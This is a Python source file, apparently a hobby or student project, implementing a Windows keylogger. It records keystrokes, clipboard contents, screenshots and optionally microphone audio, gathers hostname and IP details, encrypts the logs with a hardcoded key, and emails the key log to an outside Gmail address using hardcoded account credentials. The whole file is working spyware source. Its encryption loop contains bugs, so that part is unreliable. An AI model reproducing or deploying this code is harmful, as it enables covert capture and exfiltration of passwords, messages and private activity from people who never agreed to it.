# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key,Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process,freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
audio_information = "audio.wav"
ss_information = "ss.png"
key = "AD8nFgFj4EI6KRjFsL00v77Haf-uRNppHCn0Hchqf7E="
microphone_time = 10
time_iteration = 15
number_of_iteration_end = 3
file_path = "C:\\Users\\asus\\PycharmProjects\\keylogger\\project"
extend = "\\"
file_merge = file_path+extend
email_address = "projectkeylogger01@gmail.com"
password = "project001"
toaddr = "projectkeylogger02@gmail.com"
count = 0
keys = []

# sending mail
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body,'plain'))

    filename = filename
    attachment = open(attachment,'rb')

    p = MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition',"attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)
    text = msg.as_string()

    s.sendmail(fromaddr,toaddr,text)
    s.quit()


send_email(keys_information,file_path + extend + keys_information,toaddr)

# Getting computer/system information
def computer_information():
    with open(file_path + extend + system_information,"a") as f:
        hostname = socket.gethostname()
        IpAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public Ip Address : "+public_ip)
        except Exception:
            f.write("Couldn't find the Ip address")

        f.write("Processor : " + (platform.processor()) + '\n')
        f.write("System : " + (platform.system()) + " " + (platform.version()) + '\n')
        f.write("Machine : " + platform.machine() + '\n')
        f.write("Hostname : " + hostname)
        f.write("Private Ip Address : " + IpAddr)

computer_information()

# Gathering Clipboard Information
def copy_clipboard():
    with open(file_path+extend+clipboard_information,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard data: " +'\n'+ pasted_data)
        except Exception:
            f.write("Clipboard couldn't be copy")

copy_clipboard()

# Recording Audio
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs),samplerate = fs, channels = 2)
    sd.wait()

    write(file_path+extend+audio_information,fs,myrecording)

# microphone()

# Taking screenshots

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path+extend+ss_information)

screenshot()


# Adding timer at every activity
number_of_iteration = 0
currentTime = time.time()
stopping_time = time.time()+time_iteration

while number_of_iteration < number_of_iteration_end:
    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key==Key.esc:
            return False
        if currentTime > stopping_time:
            return False

    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()

    if currentTime > stopping_time:
        with open(file_path+extend+keys_information,"w") as f:
            f.write(" ")

        screenshot()

        copy_clipboard()

        number_of_iteration += 1
        currentTime = time.time()
        stopping_time = time.time()+time_iteration

# Encrypting the files
files_to_encrypt = [file_merge+system_information,file_merge+clipboard_information,file_merge+keys_information]
encrypted_files = [file_merge+system_information_e,file_merge+clipboard_information_e,file_merge+keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count],'rb') as f:
        data = f.read()

    fernet = Fernet(key)

    encrypted = fernet.encrypt(data)

    with open(encrypting_file[count],'wb') as f:
        f.write(encrypted)

    # send_email(encrypted_file[count],encrypted_file[count],toaddr)
    count += 1

time.sleep(120)
    #Basic KeyLogger is done uptill here